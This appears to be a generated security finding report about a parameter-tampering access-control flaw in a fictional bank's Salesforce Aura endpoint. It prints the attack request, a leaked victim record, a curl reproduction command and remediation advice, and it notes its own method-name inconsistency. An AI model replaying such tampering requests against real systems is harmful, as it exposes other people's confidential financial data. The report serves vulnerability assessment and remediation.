# Security Analysis Report
**System:** NexaBank Open Finance API (Salesforce-Integrated)
**Domain:** Financial Services / Retail Banking
**Example ID:** SF-0102
**Artifact analyzed:** context.txt (sole source)

---

## Priority Findings

| # | Severity | Category | Title |
|---|----------|----------|-------|
| 1 | CRITICAL | BAC — Pattern 2.4 | Privilege escalation via parameter tampering on `EventController.updateEvent` — attacker reads any banking Event record by substituting `eventId` |

---

## Finding 1 — BAC: Privilege Escalation via Parameter Tampering on Event Object (Pattern 2.4)

### Summary
The Apex controller `EventController` on NexaBank Open Finance API (`0a4235ab.lightning.force.com`) is declared `without sharing`, bypassing OWD=Private on the Event object. Per §5.0 Pattern 2.4, an attacker with a valid Salesforce session tampers with the `eventId` parameter in the Aura framework request to escalate their access and read banking Event records owned by other users.

**Context.txt inconsistency (documented):** The Apex method in §4.0 is `getEventDetails(String eventId, ...)` but the Aura descriptor in §6.0 is `c.EventController.updateEvent`. These names conflict. The HAR (§6.0) is the primary evidence — this analysis follows the HAR.

**Pattern:** 2.4 — Privilege escalation via parameter tampering (BAC)
**Affected controller:** `c.EventController.updateEvent`
**Affected endpoint:** `POST https://0a4235ab.lightning.force.com/aura`

### Evidence from HAR (§6.0)

**Request — Attack**
```
POST https://0a4235ab.lightning.force.com/aura
Authorization: Bearer 00D0A4235AB!AR0a4235ab...
Content-Type: application/x-www-form-urlencoded
X-SFDC-Session: 00D0A4235AB!AR0a4235ab...

message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN",
"params":{"eventId":"00135AB","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}
&aura.token=undefined
```

**Response — Victim Event Record Returned**
```json
{
  "actions": [{ "id": "1;a", "state": "SUCCESS", "returnValue": { "records": [{
    "Id": "00135AB", "Name": "Victim Event Record", "OwnerId": "005VICTIM",
    "InternalNotes__c": "CONFIDENTIAL: internal review notes",
    "SensitiveData__c": "SSN: 000-24-5030"
  }] }, "error": [] }]
}
```

### Steps to Reproduce
```bash
SESSION="00D0A4235AB!AR0a4235ab..."
curl -s -X POST "https://0a4235ab.lightning.force.com/aura" \
  -H "Authorization: Bearer $SESSION" -H "Content-Type: application/x-www-form-urlencoded" -H "X-SFDC-Session: $SESSION" \
  --data-urlencode 'message={"actions":[{"id":"1;a","descriptor":"c.EventController.updateEvent","callingDescriptor":"UNKNOWN","params":{"eventId":"00135AB","fields":["Id","Name","OwnerId","InternalNotes__c","SensitiveData__c"]}}]}' \
  --data-urlencode 'aura.token=undefined'
# Vulnerable: state: SUCCESS, OwnerId: 005VICTIM, SensitiveData__c: SSN: 000-24-5030
# Secure: state: ERROR — INSUFFICIENT_ACCESS
```

### Remediation
1. `public with sharing class EventController { ... }`
2. `WHERE Id = :eventId AND OwnerId = :UserInfo.getUserId()` + `WITH SECURITY_ENFORCED`
3. Server-side `fields` allowlist. Validate `aura.token`.
